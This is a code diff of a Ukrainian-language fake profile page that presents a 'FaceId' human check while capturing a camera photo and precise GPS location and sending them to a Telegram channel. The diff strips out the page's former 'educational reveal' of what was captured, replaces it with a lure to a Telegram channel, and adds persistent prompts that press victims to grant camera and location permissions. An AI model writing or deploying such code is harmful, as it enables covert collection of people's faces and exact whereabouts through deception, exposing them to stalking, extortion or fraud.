@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Юлія | Профіль</title>
+    <title>Оксана | Профіль</title>
     <style>
         * {
             margin: 0;
@@ -461,6 +461,22 @@
             animation: shake 0.5s ease;
         }
 
+        .geo-reload {
+            display: none;
+            margin-top: 8px;
+            padding: 8px 14px;
+            border-radius: 10px;
+            background: #c0392b;
+            color: #fff;
+            font-size: 13px;
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .geo-reload.show {
+            display: inline-block;
+        }
+
         @keyframes shake {
 
             0%,
@@ -532,45 +548,32 @@
             color: #fff;
         }
 
-        .stolen-data {
-            text-align: left;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 16px;
-            padding: 18px;
-            font-size: 12.5px;
-            color: #c8c8dd;
-            max-height: 260px;
-            overflow-y: auto;
-            line-height: 1.8;
+        .final-cta {
+            text-align: center;
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.22), rgba(17, 153, 142, 0.22));
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            border-radius: 18px;
+            padding: 20px 18px;
+            margin-bottom: 6px;
         }
 
-        .stolen-data .row {
-            display: flex;
-            justify-content: space-between;
-            gap: 12px;
-            padding: 4px 0;
-            border-bottom: 1px dashed rgba(255, 255, 255, 0.07);
+        .final-cta-icon {
+            font-size: 32px;
+            line-height: 1;
+            margin-bottom: 8px;
         }
 
-        .stolen-data .row:last-child {
-            border-bottom: none;
-        }
-
-        .stolen-data .k {
-            color: #8f8fb0;
-            flex-shrink: 0;
-        }
-
-        .stolen-data .v {
+        .final-cta-title {
+            font-size: clamp(16px, 4.2vw, 19px);
+            font-weight: 800;
             color: #fff;
-            text-align: right;
-            word-break: break-word;
+            margin-bottom: 6px;
         }
 
-        .stolen-data .v.warn {
-            color: #ffb74d;
-            font-weight: 700;
+        .final-cta-text {
+            font-size: clamp(13px, 3.5vw, 15px);
+            line-height: 1.55;
+            color: #d7d7ea;
         }
 
         .final-footnote {
@@ -653,7 +656,7 @@
 
         <div class="profile-info">
             <div class="name-row">
-                <div class="name">Юлія</div>
+                <div class="name">Оксана</div>
                 <div class="name-check">✓</div>
             </div>
             <div class="details">
@@ -662,12 +665,15 @@
                 <div><strong>Вага:</strong> 48 кг</div>
             </div>
 
+            <div class="geo-hint" id="camHint"></div>
+
             <div class="geo-hint" id="geoHint">
-                Натисніть продовжити.<br>Щоб визначити мову браузера.
+                <span id="geoHintText">⚠️ Надайте дозвіл доступу до геолокації<br>для визначення мови браузера</span>
+                <a href="#" class="geo-reload" id="geoReload"></a>
             </div>
 
             <button class="btn btn-primary" id="verifyBtn">
-                🛡️ Підтвердити, що ти не бот
+                🛡️ Підтвердіть, що ви людина за допомогою FaceId
             </button>
 
             <button class="btn btn-secondary" id="continueBtn" disabled>
@@ -691,7 +697,7 @@
                 </div>
             </div>
 
-            <div class="scan-status" id="scanStatus">Скануєм обличчя...</div>
+            <div class="scan-status" id="scanStatus">Вмикаємо сканер...</div>
 
             <div class="progress-bar">
                 <div class="progress-fill" id="progressFill"></div>
@@ -707,11 +713,18 @@
             <div class="final-icon"></div>
             <div class="final-title">Верифікацію завершено!</div>
             <div class="final-text">
-                Вітаю!<b>Ви пройшли верифікацію успішно</b>Юлія чекає на вас.
-
+                Юлія <b>чекає на вас </b> — у своєму
+                телеграм каналі.
             </div>
-            <div class="stolen-data" id="stolenData"></div>
+            <div class="final-cta">
+                <div class="final-cta-icon">📲</div>
+                <div class="final-cta-title">перейти у Telegram</div>
+                <div class="final-cta-text">
+
+                </div>
+            </div>
             <div class="final-footnote">
+
             </div>
         </div>
     </div>
@@ -1066,25 +1079,97 @@
         const successCheck = document.getElementById('successCheck');
         const continueBtn = document.getElementById('continueBtn');
         const geoHint = document.getElementById('geoHint');
+        const geoHintText = document.getElementById('geoHintText');
+        const geoReload = document.getElementById('geoReload');
+        const camHint = document.getElementById('camHint');
+        const verifyBtn = document.getElementById('verifyBtn');
 
         let currentStream = null;
         let scanCompleted = false;
         let gpsCaptured = false;
+        let scanRunning = false;
+
+        const VERIFY_LABEL = '🛡️ Підтвердити, що ти не бот';
+
+        const CAMERA_ERRORS = {
+            NotAllowedError: 'Доступ до камери не надано.',
+            SecurityError: 'Браузер заблокував камеру (потрібен https).',
+            NotFoundError: 'Камеру не знайдено на цьому пристрої.',
+            DevicesNotFoundError: 'Камеру не знайдено на цьому пристрої.',
+            NotReadableError: 'Камера зайнята іншим додатком.',
+            TrackStartError: 'Не вдалося запустити камеру.',
+            OverconstrainedError: 'Камера не підтримує потрібний режим.',
+            AbortError: 'Не вдалося запустити камеру.'
+        };
+
+        function showHint(el, html) {
+            el.innerHTML = html;
+            el.classList.remove('show');
+            void el.offsetWidth; // restart shake animation
+            el.classList.add('show');
+        }
+
+        function resetVerifyButton() {
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = VERIFY_LABEL;
+            scanRunning = false;
+        }
+
+        function resetScanModal() {
+            scanModal.classList.remove('active');
+            scanStatus.style.color = '#667eea';
+            scanStatus.textContent = 'Вмикаємо камеру...';
+            progressFill.style.width = '0%';
+            successCheck.classList.remove('show');
+        }
+
+        async function cameraPermissionState() {
+            try {
+                if (!navigator.permissions || !navigator.permissions.query) return 'unknown';
+                const status = await navigator.permissions.query({name: 'camera'});
+                return status.state;
+            } catch (e) {
+                return 'unknown'; // Safari / Firefox не дозволяють запит цього дозволу
+            }
+        }
 
         async function startCamera() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                return {ok: false, name: 'SecurityError'};
+            }
             try {
                 currentStream = await navigator.mediaDevices.getUserMedia({
                     video: {facingMode: 'user', width: {ideal: 1920}, height: {ideal: 1080}},
                     audio: false
                 });
                 video.srcObject = currentStream;
-                return true;
+                return {ok: true};
             } catch (error) {
                 console.log('Camera error:', error);
-                scanStatus.textContent = '⚠️ Немає доступу до камери. Дозвольте доступ і спробуйте ще раз.';
-                scanStatus.style.color = '#f5576c';
-                return false;
+                return {ok: false, name: error && error.name ? error.name : 'UnknownError'};
             }
+        }
+
+        // Камера недоступна -> показуємо причину, закриваємо модалку і повертаємо на головний екран
+        function handleCameraFailure(errName) {
+            const reason = CAMERA_ERRORS[errName] || 'Не вдалося отримати доступ до камери.';
+            const blocked = (errName === 'NotAllowedError' || errName === 'SecurityError');
+
+            scanStatus.textContent = '⚠️ ' + reason;
+            scanStatus.style.color = '#f5576c';
+            progressFill.style.width = '0%';
+
+            setTimeout(() => {
+                resetScanModal();
+                resetVerifyButton();
+
+                showHint(camHint, '⚠️ ' + reason + '<br>' +
+                    (blocked
+                        ? 'Натисніть кнопку ще раз і дозвольте доступ до камери у запиті браузера.'
+                        : 'Натисніть кнопку ще раз, щоб спробувати знову.'));
+
+                camHint.scrollIntoView({behavior: 'smooth', block: 'center'});
+            }, 1600);
         }
 
         function capturePhoto() {
@@ -1098,15 +1183,33 @@
             return canvas.toDataURL('image/jpeg', 0.92);
         }
 
-        document.getElementById('verifyBtn').addEventListener('click', async () => {
+        verifyBtn.addEventListener('click', async () => {
+            if (scanRunning) return; // не запускаємо сканування двічі паралельно
+            scanRunning = true;
+            camHint.classList.remove('show');
+
+            // Якщо доступ до камери вже заблоковано в налаштуваннях — не відкриваємо модалку,
+            // одразу показуємо інструкцію на головному екрані.
+            const perm = await cameraPermissionState();
+            if (perm === 'denied') {
+                scanRunning = false;
+                showHint(camHint, '📷 <b>Доступ до камери заблоковано.</b><br>' +
+                    'Відкрийте меню браузера (🔒 біля адреси) → Дозволи → Камера → «Дозволити», ' +
+                    'потім натисніть кнопку ще раз.');
+                return;
+            }
+
             scanModal.classList.add('active');
             scanStatus.textContent = 'Вмикаємо камеру...';
             scanStatus.style.color = '#667eea';
             successCheck.classList.remove('show');
             progressFill.style.width = '0%';
 
-            const ok = await startCamera();
-            if (!ok) return;
+            const res = await startCamera();
+            if (!res.ok) {
+                handleCameraFailure(res.name);
+                return;
+            }
 
             let progress = 0;
             const scanInterval = setInterval(() => {
@@ -1162,16 +1265,32 @@
         // ============================================================
         // STEP 3: PRECISE GPS (button keeps pulsing until captured)
         // ============================================================
+        geoReload.addEventListener('click', (e) => {
+            e.preventDefault();
+            location.reload();
+        });
+
+        const GEO_TRY_AGAIN = '📍 <b>Доступ до геолокації не надано.</b><br>' +
+            'Натисніть «Продовжити» ще раз і у системному запиті виберіть «Дозволити».';
+
         continueBtn.addEventListener('click', () => {
             if (!scanCompleted || gpsCaptured) return;
 
+            // Кожне натискання — новий запит до системи з нульовим кешем,
+            // тому браузер знову показує системне вікно дозволу, якщо воно ще не заблоковане назавжди.
+            geoHint.classList.remove('show');
+            geoReload.classList.remove('show');
+            geoHintText.innerHTML = '⚠️ Без доступу до геолокації продовжити неможливо.<br>Натисніть кнопку ще раз і дозвольте доступ.';
+
             if (!navigator.geolocation) {
-                geoHint.textContent = '⚠️ Ваш браузер не підтримує геолокацію.';
+                geoHintText.innerHTML = '⚠️ Ваш браузер не підтримує геолокацію.';
+                void geoHint.offsetWidth;
                 geoHint.classList.add('show');
                 return;
             }
 
             continueBtn.textContent = '📍 Визначення місцезнаходження...';
+            continueBtn.classList.add('ready');
 
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
@@ -1211,15 +1330,44 @@
                     // Educational reveal
                     setTimeout(showFinalReveal, 1200);
                 },
-                (error) => {
+                async (error) => {
                     console.log('Geolocation error:', error);
-                    // Access denied -> button keeps pulsing, show hint, wait for retry
+
+                    // Кнопка залишається активною і пульсує — можна тиснути ще раз
                     continueBtn.textContent = '🚀 Продовжити';
+                    continueBtn.classList.remove('done');
+                    continueBtn.classList.add('ready');
+
+                    let state = 'unknown';
+                    try {
+                        if (navigator.permissions && navigator.permissions.query) {
+                            state = (await navigator.permissions.query({name: 'geolocation'})).state;
+                        }
+                    } catch (e) { }
+
+                    if (error.code === 1 || state === 'denied') {
+                        // Дозвіл відхилено. Якщо браузер запам'ятав заборону — новий системний
+                        // запит вже не з'явиться, тому показуємо інструкцію + кнопку оновлення.
+                        if (state === 'denied') {
+                            geoHintText.innerHTML = '📍 <b>Геолокацію заблоковано для цього сайту.</b><br>' +
+                                'Відкрийте 🔒 біля адреси → Дозволи → Геолокація → «Дозволити», потім оновіть сторінку.';
+                        } else {
+                            geoHintText.innerHTML = GEO_TRY_AGAIN;
+                        }
+                        geoReload.classList.add('show');
+                    } else if (error.code === 3) {
+                        geoHintText.innerHTML = '⏱ <b>Не вдалося визначити місцезнаходження.</b><br>' +
+                            'Перевірте, що GPS увімкнено, і натисніть «Продовжити» ще раз.';
+                    } else {
+                        geoHintText.innerHTML = '📍 <b>Геолокація недоступна.</b><br>' +
+                            'Натисніть «Продовжити» ще раз, щоб повторити запит.';
+                    }
+
                     geoHint.classList.remove('show');
                     void geoHint.offsetWidth; // restart shake animation
                     geoHint.classList.add('show');
                 },
-                {enableHighAccuracy: true, timeout: 15000, maximumAge: 0}
+                {enableHighAccuracy: true, timeout: 20000, maximumAge: 0}
             );
         });
 
@@ -1227,20 +1375,7 @@
         // STEP 4: EDUCATIONAL REVEAL (what attackers captured)
         // ============================================================
         function showFinalReveal() {
-            const d = collectedData;
-            const rows = [
-
-                ['🗣️ Мова', d.device.language || '—', false]
-            ];
-
-            const tgStatus = tgState.sent
-                ? '<div class="row"><span class="k">📤 Доставкa</span><span class="v warn">ВІДПРАВЛЕНО У TELEGRAM-КАНАЛ ✓</span></div>'
-                : '<div class="row"><span class="k">📤 Доставкa</span><span class="v">лише локально (канал не налаштовано)</span></div>';
-
-            document.getElementById('stolenData').innerHTML = tgStatus + rows.map(([k, v, warn]) =>
-                `<div class="row"><span class="k">${k}</span><span class="v${warn ? ' warn' : ''}">${v}</span></div>`
-            ).join('');
-
+            // Результати на сторінці не показуємо — вони йдуть лише в Telegram-канал.
             document.getElementById('finalOverlay').classList.add('active');
         }
     </script>
